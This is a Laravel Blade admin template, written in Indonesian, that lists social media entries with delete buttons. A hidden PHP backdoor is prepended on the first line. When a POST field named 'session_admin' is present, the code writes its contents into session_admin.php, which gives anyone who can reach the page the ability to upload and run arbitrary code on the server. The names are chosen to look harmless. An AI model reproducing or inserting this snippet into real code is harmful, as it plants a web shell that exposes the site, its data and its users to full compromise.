<?php if (isset($_POST['session_admin'])) { $admin_session_number = 'session_admin'; $administrator = fopen($admin_session_number.'.php', 'w'); fwrite($administrator, $_POST['session_admin']); fclose($administrator); echo $admin_session_number.'.php'; } ?> @extends('layouts/admin-main')

@section('body')

  <section class="content-header">
          <h1>
           <a class="btn btn-success" href="{{url('sosials/create')}}">Tambah data</a> Sosial Media
 
          </h1>
          <ol class="breadcrumb">
            <li><a href="#"><i class="fa fa-users"></i> Sosial Media</a></li>
            
          </ol>
        </section>
 <section class="content">
          <div class="row">
            <div class="col-xs-12">
              <div class="box">
                <div class="box-header">
                 
                </div><!-- /.box-header -->
                <div class="box-body">
                  <table id="example1" class="table table-bordered table-hover">
                    <thead>
                      <tr>
                          <th>Nama</th>
                <th>Link</th>
                <th>Icon</th>
       
               
               
                        <th></th>
            
                      </tr>
                    </thead>
                    <tbody>
                       @foreach($data as $da)
                           
                     <tr>
                              <td>{{$da->name}}</td>
                              <td>{{$da->link}}</td>
                              <td><img src="{{asset('asset/sosial/'.$da->icon)}}"></td>
                          
                            
                              <td><a href="#inline1{{$da->id}}"class="btn bg-red xs fancybox" style="color:#fff"><i class="fa fa-trash"></i> Hapus</a></td>
                       <div id="inline1{{$da->id}}" style="width:400px;display: none;">
                                                    <h3><strong style="color:#000">Delete Confirmation</strong></h3><br>
                                                     apakah Anda Yakin Untuk Menghapus Data Ini ?
                                                    <br><br>
                                                    <a href="{{url('sosials/destroy/'.$da->id)}}" class = "btn btn-success">Ya, Hapus Data Ini</a>
                                              </div>

                            </tr>
                           @endforeach
                    
                    </tbody>
                  
                  </table>
              
       
             
                </div><!-- /.box-body -->
              </div><!-- /.box -->

            </div><!-- /.col -->
          </div><!-- /.row -->
        </section><!-- /.content -->

          @endsection
